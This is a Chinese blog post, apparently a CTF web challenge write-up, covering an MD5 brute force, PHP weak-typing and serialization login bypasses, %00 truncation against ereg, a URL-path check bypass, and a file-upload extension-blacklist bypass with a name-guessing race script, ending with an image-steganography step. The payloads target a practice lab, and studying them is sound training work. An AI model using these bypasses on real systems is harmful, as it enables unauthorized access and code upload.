---
layout: post
title: 条条大路通罗马系列2 web writeup
category: writeup
tags: ctf
description:
---

想和各位赛棍学习的菜鸟。


[三个白帽][1]
----------

0x00 隐藏在cookie里的源码信息.
---------------------

 官方并没有什么提示,想着信息应该在数据包里面于是用burp截包看了看.
 发现cookie中有串奇怪的字符串
 
     source=WXpOV2FXTXpVbmxMUnpGclRsTm5hMWd3WkVaV1JuTnVZekk1TVdOdFRteEtNVEJ3VEVSTmMwNXBhemxRVTBrMFRWZEZNRTFxWTJr
     
感觉是base64 然后解码发现经过3次.

    substr(md5($_GET['source']),3,6)=="81a427"

   嗯,我们要找到一个字符串的md5的第3位到第8位是81a427   这个范围还是有点小毕竟这么多.
先试试1-999999的数字吧.
代码如下.

    import hashlib
    def md5(str):
	m = hashlib.md5()
	m.update(str)
	return m.hexdigest()
    for i in range(1,99999):
	a=str(i)
	flag=md5(a)
	if flag[3:9] == '81a427':
		print a
运气不错
payload:`47733`
![md5.jpg][2]

   payload:`/?source=47733`

![源码.jpg][3]
 
payload:`WoShiYuanMa_SGBM.zip`
然后得到源码.

0x01 小代码中的大秘密.
----

index.php
---------

 开始一看到代码中的反序列函数以为是反序列.然后群里面的某赛棍就叫我在仔细看看代码啊大兄弟.

    $password = unserialize($_POST['password']);

    	if($_POST['username']='admin' && $password['username'] !== 'admin' && $password['password'] !== 'admin'){

传入参数username=admin  passwrod中用了不恒等于只有返回false 整个语句才会得到 false，其他全部得到true 就算返回0也是得到true
那么使username和password的值为0试试看 php是弱类型啊.
当然需要序列化.构造个数组吧.

    <?php
    $arr = array("username"=>0,"password"=>0);
    var_dump($arr);
    $id = serialize($arr);
    echo ($id) ;
    ?>
  
得到`a:2:{s:8:"username";i:0;s:8:"password";i:0;}`
payload:`username=admin&password=a:2:{s:8:"username";i:0;s:8:"password";i:0;}&submit=Submit`

![index.jpg][4]
----------

main.php
--------

    if (strpos($_POST['salt'], '*SGBM*') !== FALSE)

1.使用了不恒等于返回0也为true
嗯，这样其他的什么正则都不用看了吧.
让salt的值为null就能成立
var_dump( array(0) >999999999); //true 
payload:`salt[]=00&submit=Submit`
2.要求$_POST['salt']长度小于11，但是值却大于999999999，且需要包含*SGBM*。 
因为是用ereg()函数来截取字符，我们用%00截断，就可以绕过函数提交*。 
但是还需要大于999999999，我们换个计数法，9e9。 
最后提交：`9e9%00*SGBM*`，刚好10位 


![main.jpg][5]

----------

admin/index.php
---------------
这是获取REQUEST_URI

1.url里面不能出现"./" 
2.第二个要求就是不得出现 \ 
3.限制，a-z / 和 .
4.不能出现 //
5.必须以/index.php结尾
6.不能在php后面加.
7.
```
    else if($URL == '/admin/index.php'){
	exit('<script>alert("友谊的小船,说翻就翻了！！")</script>');
    }
    else {
	if($URL !== '/admin/index.php'){
```
不恒等于啊，而且上面又有一个==可怕.
要和admin/index.php不一样.
然后猫哥告诉我试试index.php/index.php吧
然后就没有然后了.一看还真是这样过的判断.唉小菜啊.
payload:`/admin/index.php/index.php`


----------

/admin/upload.php
-----------------

    $blackext = ["php", "php3", "php4", "php5", "pht", "phtml", "phps"];//总有一款适合你
说明不是常规的绕过什么的应该是有其他的解析后缀,出题人在群里面提示说熟悉框架应该容易想到不要局限环境。
框架好像常见include的有inc ini 等等先试试inc吧
文件命名md5时间和10-99任意数字。
然后文件夹名字就是年份加月份
这个还不简单.

    $filename = md5(time().rand(10, 99)) . "." . $filearr["extension"];
    $destination_folder .= date('Y', time()) . "/" . date('m', time()) . "/";

获取代码如下.

    <?php
    $url="http://4e79618700b44607c.jie.sangebaimao.com/uploads/2016/05/".md5(time().rand(10, 99)).".inc";
    echo $url;
    file_get_contents($url);
    ?>

当然也可以根据返回的时间构造加密也是一样的.这个是我扣的代码直接复制的。
然后burp上传发包20个线程 get脚本30个线程就好.
果然
![info.jpg][6]


----------

0x02 隐藏在图片里的flag.
---------------------
以前不是到这就结束了么，然而web题变成了图片隐写题了.
![fla.jpg][7]

打开发现文件末尾有个flag.txt
怀疑是压缩包copy弄成的，直接改后缀用rar打开.
![4.jpg][8]

![12.jpg][9]

想到是RGB三原色，一共100548组，就先利用大整数分解法。蓝猫赛棍告诉我一个神奇的网站[www.factordb.com][10]
![QQ截图20160521134428.jpg][11]

然后就构造长度和宽度
然而没啥经验走了不少坑
最后蓝猫大牛看不下去了 于是告诉我了长宽.
 

    2*3*3*7*7 x 2*3*19

然后构造画布使用java代码画出来就行
就得到了flag
![1.jpg][12]

java代码，要导入相关库

    public class PicTest {  
    public static void main(String[] args) throws IOException {  
        BufferedReader br = new BufferedReader(new InputStreamReader(  
                new FileInputStream("G:\\misc100.txt")));  
        int i,j;  
          
        String line = br.readLine();  
        int rgb[] = new int[3];  
        File file = new File("G:\\1.jpg");// 实例化file对象，并设置读取图片路径  
        BufferedImage bi = null; // 像素缓冲区开始为空  
        bi = ImageIO.read(file);  
        int width = bi.getWidth();  
        int height = bi.getHeight();  
        int minx = bi.getMinX();  
        int miny = bi.getMinY();  
        for (i = 0; i < width; i++) {  
            for (j = 0; j < height; j++) {  
    //              int pixel = bi.getRGB(i, j);  
    //              rgb[0] = (pixel & 0xff0000) >> 16;  
    //              rgb[1] = (pixel & 0xff00) >> 8;  
    //              rgb[2] = (pixel & 0xff);  
    //              System.out.println("i=" + i + ",j=" + j + ":(" + rgb[0] + ","  
    //                      + rgb[1] + "," + rgb[2] + ")"+pixel);  
                if(line == null) break;  
                String[] rgbs=line.toString().split(",");  
                rgb[0]=new Integer(rgbs[0]);  
                rgb[1]=new Integer(rgbs[1]);  
                rgb[2]=new Integer(rgbs[2]);  
                bi.setRGB(i, j, Integer.parseInt(Integer.toHexString(rgb[0])+Integer.toHexString(rgb[1])+Integer.toHexString(rgb[2]),16));  
                //bi.setRGB(i, j, Integer.parseInt("ffffff",16));  
                line = br.readLine();  
            }  
        }  
        ImageIO.write(bi, "JPEG", file); //写入文件  
        br.close();  
     }  
    }  


----------
官方給的python版的.
```
#-*- coding:utf-8 -*- 
from PIL import Image 
import re 

x = 882 
y = 114 

im = Image.new(\"RGB\",(x,y)) 
file = open('flag.txt') 

for i in range(0,x): 
    for j in range(0,y): 
        line = file.readline() 
        rgb = line.split(\",\") 
        im.putpixel((i,j),(int(rgb[0]),int(rgb[1]),int(rgb[2]))) 
im.save(\"ok.png\")
```
圖片生成flag.txt
```
from PIL import Image 

im = Image.open('flag.png') 
pix = im.load() 
width = im.size[0] 
height = im.size[1] 
for x in range(width): 
    for y in range(height): 
    rgb = pix[x, y] 
    print rgb
```



感谢各位大牛不厌其烦的带小菜我,我一定会成为一名合格的赛棍和web狗.


  [1]: http://www.sangebaimao.com/
  [2]: https://img.scanfsec.com/img/2016051435646449.jpg
  [3]: https://img.scanfsec.com/img/20160530949601.jpg
  [4]: https://img.scanfsec.com/img/2016052289077881.jpg
  [5]: https://img.scanfsec.com/img/201605362622834.jpg
  [6]: https://img.scanfsec.com/img/2016051959105931.jpg
  [7]: https://img.scanfsec.com/img/2016053761230118.jpg
  [8]: https://img.scanfsec.com/img/2016052710454243.jpg
  [9]: https://img.scanfsec.com/img/2016054187106244.jpg
  [10]: http://www.factordb.com
  [11]: https://img.scanfsec.com/img/201605787339937.jpg
  [12]: https://img.scanfsec.com/img/2016054271381050.jpg
